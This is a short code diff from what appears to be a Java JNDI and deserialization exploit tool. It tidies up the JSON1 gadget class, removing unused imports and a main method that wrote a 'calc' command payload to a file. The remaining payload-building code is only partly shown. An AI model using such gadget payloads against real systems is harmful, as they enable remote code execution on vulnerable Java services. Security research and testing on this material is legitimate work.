@@ -4,32 +4,17 @@ import com.nu1r.jndi.enumtypes.PayloadType;
 import com.nu1r.jndi.gadgets.utils.Gadgets;
 import com.nu1r.jndi.gadgets.utils.Reflections;
 import net.sf.json.JSONObject;
-import org.apache.commons.collections.Transformer;
-import org.apache.commons.collections.functors.ChainedTransformer;
-import org.apache.commons.collections.functors.ConstantTransformer;
-import org.apache.commons.collections.functors.InvokerTransformer;
-import org.apache.commons.collections.keyvalue.TiedMapEntry;
-import org.apache.commons.collections.map.LazyMap;
 import org.springframework.aop.framework.AdvisedSupport;
 
 import javax.management.openmbean.*;
 import javax.xml.transform.Templates;
 import java.io.ByteArrayOutputStream;
-import java.io.FileOutputStream;
 import java.io.ObjectOutputStream;
-import java.lang.reflect.Field;
 import java.lang.reflect.InvocationHandler;
 import java.util.HashMap;
-import java.util.HashSet;
 import java.util.Map;
 
 public class JSON1 {
-    public static void main(String[] args) throws Exception {
-        byte[]           bytes = getBytes(PayloadType.command, "calc");
-        FileOutputStream fous  = new FileOutputStream("6666.ser");
-        fous.write(bytes);
-        fous.close();
-    }
 
     public static byte[] getBytes(PayloadType type, String... param) throws Exception {
         Object tql    = Gadgets.createTemplatesImpl(type, param);
